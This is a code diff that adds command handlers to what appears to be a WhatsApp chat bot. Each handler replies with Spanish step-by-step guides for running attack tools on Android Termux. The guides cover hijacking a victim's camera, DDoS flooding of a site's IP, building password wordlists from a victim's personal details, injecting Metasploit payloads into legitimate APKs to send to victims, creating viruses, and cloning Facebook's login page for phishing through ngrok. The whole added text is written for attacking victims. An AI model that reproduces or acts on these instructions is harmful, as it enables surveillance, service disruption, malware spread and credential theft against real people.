@@ -4969,6 +4969,236 @@ $  ls
 $ bash install.sh
 $ ./Sploit`)
                   }
+			
+	if (budy.includes(`/grabscam`)) {
+                  reply(`📲GrabCam📲
+
+🔒 Piratería de cámaras por herramienta de enlace. Es un script basado en bash que está hecho oficialmente para termux a partir de esta herramienta que puede hackear la cámara de tu víctima con una simple página de oferta. Esta herramienta funciona tanto en dispositivos Android rooteados como en dispositivos Android no rooteados. 🔒
+
+📲Instalación📲
+
+$ apt-get update
+$ apt-get upgrade
+$ pkg install python 
+$ pkg install python2
+$ pkg install git
+$ pip install lolcat
+$ git clone https://github.com/noob-hackers/grabcam
+$ ls
+$ cd grabcam
+$ ls
+$ bash grabcam.sh
+Hackear micrófono android,ios ,pc.*`)
+                  }
+			
+	if (budy.includes(`/hammer`)) {
+                  reply(`📱¿Que es Hammer?📱
+
+💉Que es DDoS y Como funciona¿?💉
+
+Los ataques de red distribuidos a menudo se conocen como ataques de denegación distribuida de servicio (DDoS), El ataque DDoS envía varias solicitudes al recurso web atacado, con la intención de desbordar la capacidad del sitio web para administrar varias solicitudes y de evitar que este funcione correctamente.
+
+📱Instalacion:📱
+
+$ pkg install -y git
+$ pkg install -y python
+$ pkg install -y python2
+$ pkg install -y nmap
+$ pkg install net-tools
+$ git clone https://github.com/cyweb/hammer
+$ cd hammer
+
+💻USO CORRECTO:💻
+
+Primero sacamos la ip del sitio web 
+
+ping sitio sin http o https
+
+python hammer -s IP  -p 80 -t 135
+
+Es .py pero facebook bloquea si lo pongo correctamente
+
+( -s ) Sirve para indicar la IP del sitio web de la víctima.
+
+( -p ) Sirve para indicar el puerto que atacaremos, en éste caso el puerto mas recomendado y por defecto es 80.
+
+( -t ) Sirve para indicar la velocidad en la cual se enviarán los paquetes, en éste caso la velocidad mas recomendada y por defecto es 135`)
+                  }
+			
+	if (budy.includes(`/kali-nethunter`)) {
+                  reply(`📱¿Que es Kali-Nethunter?📱
+
+Este es un script mediante el cual puede instalar Kali nethunter (Kali Linux) en su aplicación termux sin un teléfono rooteado.
+
+📱Installation:📱
+
+$ apt update 
+$ apt upgrade
+$ apt install git
+$ git clone https://github.com/Hax4us/Nethunter-In-Termux
+$ cd Nethunter-In-Termux
+$ chmod +x *
+$ ./kalinethunter
+
+Now select your architecture 
+
+Now type this command to start 
+
+$ startkali
+Compulsory Steps For First Time Use
+
+So after startkali
+
+execute this command
+
+$ apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys 7D8D0BF6
+
+Now its time to update
+
+$ apt-get update`)
+                  }
+			
+	if (budy.includes(`/cupp`)) {
+                  reply(`📱¿Qué es cupp?📱
+
+cupp es una herramienta que nos permite generar diccionarios con información de personas, generalmente esta herramienta se usa para los ataques de fuerza bruta.
+
+📱INSTALACIÓN DE cupp EN TERMUX (ANDROID)📱
+
+$ apt update && apt upgrade -y
+$ termux-setup-storage
+$ pkg install -y git
+$ pkg install -y python
+$ pkg install -y python2
+$ git clone https://github.com/Mebus/cupp.git
+$ cd cupp
+$ ./cupp.py
+$ ./cupp.py -i
+
+Muy bien, aquí debes escribir la información de la víctima, entre mas información es mejor, ya que tu diccionario tendra mas posibilidades de crear una contraseña correcta, EJEMPLO:
+
+Primer Nombre: Termux
+Apellido : Hacking
+Apodo: Error404
+Cumpleaños: 25121996
+Novi@: 
+apodo novi@:
+Cumpleaños novia:
+Nombre hijo:
+Apodo hijo:
+Cumpleaños hijo:
+Nombre de mascota:
+Trabajo/Escuela/Compania:
+
+¿Agregar palabras claves? [Y/N]: y
+ejemplo: rock, basket, computadora, rojo
+
+¿agregar caracteres? [Y/N]: y
+¿agregar números? [Y/N]: y
+¿agregar letras? [Y/N]: y
+
+Diccionario creado como >> ejemplo.txt
+
+PARA LEER EL DICCIONARIO ESCRIBIMOS EL COMANDO: cat ejemplo.txt`)
+                  }
+			
+	if (budy.includes(`/infectador-framework`)) {
+                  reply(`📲 infectador-framework 📲
+
+Es un script que te permite infectar apks legítimas con 6 payloads diferentes a elejir los comandos para instalar el script son:
+
+$ apt update && apte upgrade -y 
+$ pkg install -y git 
+$ git clone https://github.com/Cesar-Hack-Gray/infectador-framework 
+$ cd infectador-framework 
+$ ls 
+$ bash setup 
+
+Esta parte tardará un poco solo esperen a que se instalen los paquetes necesarios para el script Ya cuendo aya terminado de descargar todos los paquetes ejecutan el script con:
+
+$ ./Infectador Apreten enter 
+
+Elijen el payload que quieran usar para infectar el apk poniendo el número que tenga detrás el payload
+
+ Aquí ponen la ruta del apk legítima que quieren infectar por ejemplo si la apk se encuentra en descargas y se llama Base.apk la ruta sería: 
+
+$ /sdcard/Download/Base.apk
+
+ Ojo eso es un ejemplo ustedes ponen la ruta de dónde se encuentre el apk con su respectivo nombre
+
+Aquí pondrán su IP, para saber cuál es su IP pueden abrir otra sesión y escribir *ifconfig ahíh buscan su IP y la pegan en la sesión del infectador Aquí ponen el puerto de su preferencia Aquí le elijen un nuevo nombre al apk Aquí apretan "Y" y le dan a enter Ya se estaría infectando el apk legítima solo deben esperar Ya cuendo aya terminado de infectar el apk elijen la opción 2 es lo más recomendable Bueno aquí les pedirá iniciar metasploit ustedes apretan "Y" le dan a enter y le dan devuelta a "Y",metasploit se estaría conectando con el apk infectada El apk infectada se les guardará en la carpeta de infectador-framework solo deben ingresar a la carpeta y mover el apk infectada a HOME ya solo queda mandar el apk infectada a la víctima*`)
+                  }
+			
+	if (budy.includes(`/evil-create-framework`)) {
+                  reply(`📱 CREAR TROYANO 📱
+
+📱Instalación 📱
+
+$ pkg update
+$ pkg upgrade
+$ pkg install git
+$ pkg install python2
+$ git clone https://github.com/LOoLzeC/Evil-create-framework
+$ ls
+$ cd Evil-create-framework
+$ ls
+$ chmod +x vcrt.py
+$ python2 vcrt.py
+
+help
+
+show android
+
+create virus/y aquí elegimos el virus
+
+SET OUTPUT /sdcard
+
+SET NAME VIRUS (y le ponemos un nombre)
+
+go`)
+                  }
+			
+	if (budy.includes(`/weeman`)) {
+                  reply(`📱¿Qué es weeman?📱
+
+weeman es una herramienta que copia el código html de una página web a tu elección, y crea un enlace phishing con dichos datos.
+
+📱INSTALACIÓN DE weeman EN TERMUX (ANDROID)📱
+
+EJECUTAR UNA SESIÓN DE ngrok
+
+ngrok tcp 4444
+
+ABRIR UNA NUEVA SESIÓN EN TERMUX...
+
+apt update && apt upgrade -y
+$ termux-setup-storage
+$ pkg install -y python
+$ pkg install -y python2
+$ pkg install -y git
+$ git clone https://github.com/evait-security/weeman
+$ cd weeman
+$ chmod 777 weeman.py
+$ python2 weeman.py
+
+CON ESTO YA TIENES INSTALADO weeman EN TERMUX, A CONTINUACIÓN TE MOSTRARE UN EJEMPLO DE COMO USARLO...
+
+show options
+
+set url https://m.facebook.com
+[Página a clonar]
+
+set port 4444
+[Puerto usado en ngrok]
+
+set action_url https://www.google.com
+[Página de redirección]
+
+run
+[Comenzar]
+
+AQUÍ SE ALMACENARAN LOS DATOS DE LA VÍCTIMA, PARA ELLO TIENES QUE ENVIAR EL LINK QUE ESTA EN TU SESIÓN DE NGROK.`)
+                  }
        if (budy.startsWith(`:v`)) {
         const none = fs.readFileSync('./mp3/viejo1.mp3');
 		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
